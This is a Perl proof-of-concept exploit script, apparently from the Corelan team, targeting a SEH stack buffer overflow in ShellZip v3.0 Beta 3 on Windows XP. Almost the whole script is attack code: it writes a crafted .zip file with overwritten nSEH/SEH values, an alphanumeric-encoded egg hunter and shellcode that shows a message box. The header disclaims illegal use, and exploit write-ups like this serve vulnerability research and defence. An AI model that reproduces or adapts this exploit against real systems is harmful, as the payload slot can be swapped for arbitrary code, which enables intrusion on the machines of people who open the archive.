#***********************************************************************************
# Exploit Title : Shellzip v3.0 Beta 3 (.zip) 0day Stack Buffer Overflow PoC exploit
# Date          : 16/05/2010
# Author        : Sud0
# Bug found by  : Sud0
# Software Link : http://www.softsea.com/download/ShellZip.html
# Version       :  3;0 Beta 3
# OS            : Windows
# Tested on     : XP SP3 En (VirtualBox)
# Type of vuln  : SEH
# Thanks to my wife for her support
# Greetz to: Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
# Corelan does not want anyone to use this script
# for malicious and/or illegal purposes
# Corelan cannot be held responsible for any illegal use.
#
# Note : you are not allowed to edit/modify this code. 
# If you do, Corelan cannot be held responsible for any damages this may cause.
#***********************************************************************************
#code :
print "|------------------------------------------------------------------|\n";
print "|                         __               __                      |\n";
print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |\n";
print "|  / ___/ __ \\/ ___/ _ \\/ / __ `/ __ \\   / __/ _ \\/ __ `/ __ `__ \\ |\n";
print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |\n";
print "| \\___/\\____/_/   \\___/_/\\__,_/_/ /_/   \\__/\\___/\\__,_/_/ /_/ /_/  |\n";
print "|                                                                  |\n";
print "|                                       http://www.corelan.be:8800 |\n";
print "|                                                                  |\n";
print "|-------------------------------------------------[ EIP Hunters ]--|\n\n";
print "[+] Exploit for .... \n";
 
my $ldf_header = "\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00" .
"\xe4\x0f" .# file size: don't change
"\x00\x00\x00";
 
my $cdf_header = "\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\xe4\x0f". # file size: don't change
"\x00\x00\x00\x00\x00\x00\x01\x00".
"\x24\x00\x00\x00\x00\x00\x00\x00";
 
my $eofcdf_header = "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00".
"\x12\x10\x00\x00". #
"\x02\x10\x00\x00". #
"\x00\x00";
 
#Corelan MsgBox
my $shellcode = "w00tw00t" . "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x7a\x31\xc9\x64\x8b".
"\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b".
"\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24".
"\x24\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a".
"\x20\x01\xeb\xe3\x37\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0".
"\xfc\xac\x84\xc0\x74\x0a\xc1\xcf\x0d\x01\xc7\xe9\xf1\xff\xff".
"\xff\x3b\x7c\x24\x28\x75\xde\x8b\x5a\x24\x01\xeb\x66\x8b\x0c".
"\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c".
"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec".
"\x52\xe8\x9c\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87".
"\x1c\x24\x52\xe8\x8b\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20".
"\xff\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x88\x5c\x24\x0a".
"\x89\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87".
"\x1c\x24\x52\xe8\x5e\xff\xff\xff\x68\x6c\x61\x6e\x58\x68\x63".
"\x6f\x72\x65\x31\xdb\x88\x5c\x24\x07\x89\xe3\x68\x64\x58\x20".
"\x20\x68\x6f\x69\x74\x65\x68\x65\x78\x70\x6c\x31\xc9\x88\x4c".
"\x24\x09\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50".
"\xff\x55\x08";
 
my $filename="shellzip.zip";
#Egg Hunter encoded with basereg ESI
my $egg="VYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI56K1JjYoDOrbpRSZURrxxMtnWLgupZPtxoOH47Tp6Pd4nkyjnOQekZnOpuKWKOxgA";
 
my $size = 4064;
# Aligne ESI to start of egghunter + Call ESI
my $junk = "AA". $egg ."A" x (224-length($egg))  .
"\x58\x58\x58" .
"\x2D\x3B\x54\x55\x55".
"\x2D\x3B\x54\x55\x55".
"\x2D\x3C\x56\x55\x55".
"\x50\x5E\x53\x58" . "\x98\x99";
 
$junk =$junk . "A" x( 288-length($junk)); # some JUNK
 
my $nseh = "\x74\xA8\x74\x20";
my $seh = "\x3E\x4B\x60\x00";
 
my $payload = $junk.$nseh.$seh . "A" x 25 . $shellcode . "B" x (4064-288-25-8-length($shellcode)). ".txt";   
 
print "Size : " . length($payload)."\n";
print "Removing old $filename file\n";
system("del $filename");
print "Creating new $filename file\n";
open(FILE, ">$filename");
 
print FILE $ldf_header . $payload . $cdf_header . $payload . $eofcdf_header;
close(FILE);
